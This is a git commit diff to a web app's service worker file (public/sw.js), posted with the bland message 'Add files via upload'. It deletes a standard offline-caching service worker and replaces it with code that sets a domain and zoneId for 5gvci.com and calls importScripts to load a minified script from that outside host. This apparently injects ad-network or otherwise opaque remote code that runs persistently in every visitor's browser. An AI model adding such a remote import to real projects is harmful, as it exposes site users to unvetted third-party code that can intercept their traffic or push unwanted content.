8b3f834a20605540cb3d621b6859fc6e2db6fdf9
reddy654 <sprkadvance@gmail.com>
2026-04-30 08:48:07 +0530

    Add files via upload

--- public/sw.js
+++ public/sw.js
@@ -1,46 +1,6 @@
-const CACHE_NAME = 'rupee-riches-cache-v1';
-const urlsToCache = [
-  '/',
-  '/manifest.json',
-  '/styles/globals.css', 
-  '/icons/icon-192x192.png',
-  '/icons/icon-512x512.png'
-];
-
-self.addEventListener('install', (event) => {
-  event.waitUntil(
-    caches.open(CACHE_NAME)
-      .then((cache) => {
-        console.log('Opened cache');
-        return cache.addAll(urlsToCache);
-      })
-  );
-});
-
-self.addEventListener('fetch', (event) => {
-  event.respondWith(
-    caches.match(event.request)
-      .then((response) => {
-        if (response) {
-          return response;
-        }
-        return fetch(event.request);
-      }
-    )
-  );
-});
-
-self.addEventListener('activate', (event) => {
-  const cacheWhitelist = [CACHE_NAME];
-  event.waitUntil(
-    caches.keys().then((cacheNames) => {
-      return Promise.all(
-        cacheNames.map((cacheName) => {
-          if (cacheWhitelist.indexOf(cacheName) === -1) {
-            return caches.delete(cacheName);
-          }
-        })
-      );
-    })
-  );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10943839
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
